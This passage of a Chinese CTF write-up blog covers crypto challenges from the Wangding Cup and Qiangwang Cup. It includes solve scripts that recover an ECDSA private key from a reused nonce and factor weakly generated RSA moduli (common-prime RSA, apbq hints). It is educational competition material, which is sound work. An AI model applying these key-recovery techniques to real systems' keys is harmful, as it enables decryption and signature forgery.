class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">victory_encrypted_flag = victory_encrypt(flag, victory_key)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">7</span></span><br><span class="line">xG = <span class="number">0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798</span></span><br><span class="line">yG = <span class="number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span></span><br><span class="line">G = (xG, yG)</span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line">h = <span class="number">1</span></span><br><span class="line">zero = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">dA = nextprime(random.randint(<span class="number">0</span>, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dA &gt; n:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;warning!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addition</span>(<span class="params">t1, t2</span>):</span><br><span class="line">    <span class="keyword">if</span> t1 == zero:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    <span class="keyword">if</span> t2 == zero:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    (m1, n1) = t1</span><br><span class="line">    (m2, n2) = t2</span><br><span class="line">    <span class="keyword">if</span> m1 == m2:</span><br><span class="line">        <span class="keyword">if</span> n1 == <span class="number">0</span> <span class="keyword">or</span> n1 != n2:</span><br><span class="line">            <span class="keyword">return</span> zero</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = (<span class="number">3</span> * m1 * m1 + a) % p * gmpy2.invert(<span class="number">2</span> * n1 , p) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p</span><br><span class="line">    m3 = (k * k % p - m1 - m2 + p * <span class="number">2</span>) % p</span><br><span class="line">    n3 = (k * (m1 - m3) % p - n1 + p) % p</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(m3),<span class="built_in">int</span>(n3))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplication</span>(<span class="params">x, k</span>):</span><br><span class="line">    ans = zero</span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(t &lt;= k):</span><br><span class="line">        <span class="keyword">if</span> (k &amp;t )&gt;<span class="number">0</span>:</span><br><span class="line">            ans = addition(ans, x)</span><br><span class="line">        x = addition(x, x)</span><br><span class="line">        t &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrs</span>(<span class="params">z, k</span>):</span><br><span class="line">    (xp, yp) = P</span><br><span class="line">    r = xp</span><br><span class="line">    s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n</span><br><span class="line">    <span class="keyword">return</span> r,s</span><br><span class="line"></span><br><span class="line">z1 = random.randint(<span class="number">0</span>, p)</span><br><span class="line">z2 = random.randint(<span class="number">0</span>, p)</span><br><span class="line">k = random.randint(<span class="number">0</span>, n)</span><br><span class="line">P = multiplication(G, k)</span><br><span class="line">hA = multiplication(G, dA)</span><br><span class="line">r1, s1 = getrs(z1, k)</span><br><span class="line">r2, s2 = getrs(z2, k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;z1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(z1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;z2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(z2))</span><br><span class="line"></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC)</span><br><span class="line">iv = cipher.iv</span><br><span class="line">encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size))</span><br><span class="line">encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted flag (AES in CBC mode, hex):&quot;</span>, encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># r1 = 11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line"><span class="comment"># r2 = 11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line"><span class="comment"># s1 = 40939314972385973234538799073526528418921185412931089406906904671430814294251</span></span><br><span class="line"><span class="comment"># s2 = 20521265832237322311837491925934175279870547563516618597235100170259508682349</span></span><br><span class="line"><span class="comment"># z1 = 86373733089658748931377346977504497606857910789811212034370600969224209571891</span></span><br><span class="line"><span class="comment"># z2 = 114906325375159287808320541183977807561041047925384600130919891200501605749979</span></span><br><span class="line"><span class="comment"># (&#x27;Encrypted flag (AES in CBC mode, hex):&#x27;, u&#x27;57608ba208813e738e7a354399e77272017548f9abf0da7a179a1136cda57579720b68a3ed46d85f5997c35af18f42175f43e856a0f64d964e7ab1e8a672b689&#x27;)</span></span><br></pre></td></tr></table></figure><p>代码这么长，而且看见有维吉尼亚密码这种古典密码的东西，同时还有三个看上去比较长的数学运算的函数，考虑敲打一下<code>AI</code>，得到</p><p>给定的代码输出了两个<code>ECDSA</code>签名，其中<code>r1</code>和<code>r2</code>相同，但<code>s1</code>和<code>s2</code>不同，这意味着它们使用了相同的随机数<code>k</code></p><p><code>k = (z1-z2)*inverse(s1-s2, n) % n</code>得到<code>k</code></p><p>然后根据<code>s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n</code><br />解出<code>dA</code>，<code>dA = (s1*k-z1)*inverse(r1, n) % n</code></p><p>问了<code>n</code>遍<code>AI</code>，一直有报错，无奈之下，开始认真审代码，手动纠错，发现<code>k和dA</code>的值一直都是错的，纠正完之后，有上面的两条正确的公式</p><p>最后的<code>exp</code>如下，提交<code>flag</code>的时候还发现不对，<code>flag</code>尝试后发现是全小写的，在题目给的脚本里，貌似给出了参考</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的值</span></span><br><span class="line">r1 = <span class="number">11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line">r2 = <span class="number">11455446275324978121918764201975007376236576456980676251003353868423934779741</span></span><br><span class="line">s1 = <span class="number">40939314972385973234538799073526528418921185412931089406906904671430814294251</span></span><br><span class="line">s2 = <span class="number">20521265832237322311837491925934175279870547563516618597235100170259508682349</span></span><br><span class="line">z1 = <span class="number">86373733089658748931377346977504497606857910789811212034370600969224209571891</span></span><br><span class="line">z2 = <span class="number">114906325375159287808320541183977807561041047925384600130919891200501605749979</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line">k = (z1-z2)*inverse(s1-s2, n) % n</span><br><span class="line">dA = (s1*k-z1)*inverse(r1, n) % n</span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line">enc_flag = long_to_bytes(</span><br><span class="line">    <span class="number">0x57608ba208813e738e7a354399e77272017548f9abf0da7a179a1136cda57579720b68a3ed46d85f5997c35af18f42175f43e856a0f64d964e7ab1e8a672b689</span>)</span><br><span class="line">iv = enc_flag[:<span class="number">16</span>]</span><br><span class="line">dec_flag = enc_flag[<span class="number">16</span>:]</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">dec_flag = unpad(aes.decrypt(dec_flag),</span><br><span class="line">                 AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Vigenère解密</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">victory_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    key = key.upper()</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    ciphertext = ciphertext.upper()</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext):</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(</span><br><span class="line">                (<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            plaintext += decrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">flag = victory_decrypt(dec_flag, victory_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag.lower())</span><br><span class="line"><span class="comment"># Recovered flag: wdflag&#123;8ed62e3b409bb214e6fdb0a78f63569c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc003"><a class="markdownIt-Anchor" href="#misc003"></a> misc003</h2><p>使用<code>wireshark</code>的统计<code>IPv4</code><br /><img src="https://picx.zhimg.com/80/v2-7857a7189c6729bffb6e3b2b3eda1933_1440w.png" alt="" /><br />然后试出<code>flag</code></p><h2 id="misc004"><a class="markdownIt-Anchor" href="#misc004"></a> misc004</h2><p>题目描述：某测试人员刚刚完成了一款图像加密算法的开发，想要邀请你进行深入的分析测试。<br />6，<code>IrisCTF2024</code>原题，考察的是<code>peano</code>曲线<br /><a href="https://zhuanlan.zhihu.com/p/305623626">https://zhuanlan.zhihu.com/p/305623626</a><br /><a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/#the-peano-scramble">https://almostgph.github.io/2024/01/08/IrisCTF2024/#the-peano-scramble</a></p><h2 id="web001"><a class="markdownIt-Anchor" href="#web001"></a> web001</h2><p>听说是原题<br /><a href="https://ctftime.org/writeup/30541">https://ctftime.org/writeup/30541</a><br /><code>DownUnderCTF2021</code>的题目<br />当然，比赛的时候没打</p><h2 id="web002"><a class="markdownIt-Anchor" href="#web002"></a> web002</h2><p>打的是<code>xss</code>，看了一下，学弟给打出来了，真好，不用看了</p><h1 id="强网杯s8"><a class="markdownIt-Anchor" href="#强网杯s8"></a> 强网杯s8</h1><p><a href="https://blog.s1um4i.com/2024-QWBCTF/">https://blog.s1um4i.com/2024-QWBCTF/</a></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret"></a> givemesecret</h3><p><img src="https://picx.zhimg.com/80/v2-a0d74544a80d641bf4f7fe7f5efadaab_1440w.png" alt="" /></p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRSA</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">import</span> random, gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAEncryptor</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">self.g = self.a = self.b = <span class="number">0</span></span><br><span class="line">self.e = <span class="number">65537</span></span><br><span class="line">self.factorGen()</span><br><span class="line">self.product()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorGen</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">self.g = getPrime(<span class="number">500</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(<span class="number">2</span>*self.g*self.a+<span class="number">1</span>):</span><br><span class="line">self.a = random.randint(<span class="number">2</span>**<span class="number">523</span>, <span class="number">2</span>**<span class="number">524</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(<span class="number">2</span>*self.g*self.b+<span class="number">1</span>):</span><br><span class="line">self.b = random.randint(<span class="number">2</span>**<span class="number">523</span>, <span class="number">2</span>**<span class="number">524</span>)</span><br><span class="line">self.h = <span class="number">2</span>*self.g*self.a*self.b+self.a+self.b</span><br><span class="line"><span class="keyword">if</span> gmpy2.is_prime(self.h):</span><br><span class="line">self.N = <span class="number">2</span>*self.h*self.g+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(self.N)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, msg</span>):</span><br><span class="line"><span class="keyword">return</span> gmpy2.powmod(msg, self.e, self.N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">product</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">self.flag = f.read()</span><br><span class="line">self.enc = self.encrypt(self.flag)</span><br><span class="line">self.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;self.enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N=<span class="subst">&#123;self.N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e=<span class="subst">&#123;self.e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;g=<span class="subst">&#123;self.g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RSAEncryptor()</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>2</mn><mi>a</mi><mi>g</mi><mo>∗</mo><mn>2</mn><mi>b</mi><mi>g</mi><mo>+</mo><mn>2</mn><mi>a</mi><mi>g</mi><mo>+</mo><mn>2</mn><mi>b</mi><mi>g</mi><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2</mn><mi>a</mi><mi>g</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mn>2</mn><mi>b</mi><mi>g</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">N=2ag*2bg+2ag+2bg+1=(2ag+1)*(2bg+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>找到共素数RSA</p><p><a href="https://tangcuxiaojikuai.xyz/post/ce38099f.html">https://tangcuxiaojikuai.xyz/post/ce38099f.html</a><br /><a href="https://hasegawaazusa.github.io/common-prime-rsa.html">https://hasegawaazusa.github.io/common-prime-rsa.html</a><br />直接套脚本，但需要手动调整一下gamma的值</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"></span><br><span class="line">g = </span><br><span class="line">N = </span><br><span class="line">e = </span><br><span class="line">enc = </span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gamma = <span class="number">0.2446</span></span><br><span class="line">cbits = ceil(nbits * (<span class="number">0.5</span> - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">u = M // (<span class="number">2</span> * g)</span><br><span class="line">v = M - <span class="number">2</span> * g * u</span><br><span class="line">GF = Zmod(N)</span><br><span class="line">x = GF.random_element()</span><br><span class="line">y = x ^ (<span class="number">2</span> * g)</span><br><span class="line"><span class="comment"># c的范围大概与N^(0.5-2*gamma)很接近</span></span><br><span class="line">c = bsgs(y, y ^ u, (Integer(<span class="number">2</span>**(cbits-<span class="number">1</span>)), Integer(<span class="number">2</span>**(cbits+<span class="number">1</span>))))</span><br><span class="line">ab = u - c</span><br><span class="line">apb = v + <span class="number">2</span> * g * c</span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = x ^ <span class="number">2</span> - apb * x + ab</span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个库的导入不能写在最上面</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc,d,N))).decode())</span><br></pre></td></tr></table></figure><h3 id="apbq"><a class="markdownIt-Anchor" href="#apbq"></a> apbq</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, privatekey, publickey</span>):</span><br><span class="line">        self.p, self.q, self.d = privatekey</span><br><span class="line">        self.n, self.e = publickey</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(plaintext, <span class="built_in">bytes</span>):</span><br><span class="line">            plaintext = bytes_to_long(plaintext)</span><br><span class="line">        ciphertext = <span class="built_in">pow</span>(plaintext, self.e, self.n)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(ciphertext, <span class="built_in">bytes</span>):</span><br><span class="line">            ciphertext = bytes_to_long(ciphertext)</span><br><span class="line">        plaintext = <span class="built_in">pow</span>(ciphertext, self.d, self.n)</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_keypair</span>(<span class="params">nbits, e = <span class="number">65537</span></span>):</span><br><span class="line">    p = getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    d = inverse(e, n - p - q + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (p, q, d), (n, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pt = <span class="string">&#x27;./output.txt&#x27;</span></span><br><span class="line">    fout = <span class="built_in">open</span>(pt, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    sys.stdout = fout</span><br><span class="line"></span><br><span class="line">    block_size = ceil(<span class="built_in">len</span>(flag)/<span class="number">3</span>)</span><br><span class="line">    flag = [flag[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), block_size)]</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Welcome to my apbq game&#x27;</span>)</span><br><span class="line">    <span class="comment"># stage 1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ stage 1: p + q&#x27;</span>)</span><br><span class="line">    prikey1, pubkey1 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA1 = RSA(prikey1, pubkey1)</span><br><span class="line">    enc1 = RSA1.encrypt(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ hints = <span class="subst">&#123;prikey1[<span class="number">0</span>] + prikey1[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ public key = <span class="subst">&#123;pubkey1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ enc1 = <span class="subst">&#123;enc1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage 2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ stage 2: ai*p + bi*q&#x27;</span>)</span><br><span class="line">    prikey2, pubkey2 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA2 = RSA(prikey2, pubkey2)</span><br><span class="line">    enc2 = RSA2.encrypt(flag[<span class="number">1</span>])</span><br><span class="line">    kbits = <span class="number">180</span></span><br><span class="line">    a = [getRandomNBitInteger(kbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    b = [getRandomNBitInteger(kbits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    c = [a[i]*prikey2[<span class="number">0</span>] + b[i]*prikey2[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ hints = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ public key = <span class="subst">&#123;pubkey2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ enc2 = <span class="subst">&#123;enc2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stage 3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ stage 3: a*p + q, p + bq&#x27;</span>)</span><br><span class="line">    prikey3, pubkey3 = get_keypair(<span class="number">1024</span>)</span><br><span class="line">    RSA3 = RSA(prikey3, pubkey3)</span><br><span class="line">    enc3 = RSA2.encrypt(flag[<span class="number">2</span>])</span><br><span class="line">    kbits = <span class="number">512</span></span><br><span class="line">    a = getRandomNBitInteger(kbits)</span><br><span class="line">    b = getRandomNBitInteger(kbits)</span><br><span class="line">    c1 = a*prikey3[<span class="number">0</span>] + prikey3[<span class="number">1</span>]</span><br><span class="line">    c2 = prikey3[<span class="number">0</span>] + b*prikey3[<span class="number">1</span>] </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ hints = <span class="subst">&#123;c1, c2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ public key = <span class="subst">&#123;pubkey3&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;┃ enc3 = <span class="subst">&#123;enc3&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag1: 解方程</span><br><span class="line"></span><br><span class="line">flag2：</span><br><span class="line">&lt;https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage&gt;</span><br><span class="line">&lt;https://blog.maple3142.net/2023/09/03/downunderctf-2023-writeups/&gt;</span><br><span class="line"></span><br><span class="line">flag3：&lt;https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024&gt;</span><br></pre></td></tr></table></figure><p><code>flag3</code>是用的<code>RSA2</code>的加密算法。。。纯坑人<br />如果不是的话，用上述的脚本已经分解出<code>pq</code>了，我就说怎么算都不对<br /><code>flag2</code>需要调整一下<code>DownUnderCTF</code>的脚本，原本给的三组参数并不够求出<code>pq</code>，但我们有<code>100</code>组，取前四组试试，发现刚好可以分解出<code>pq</code></p><p>最终脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number 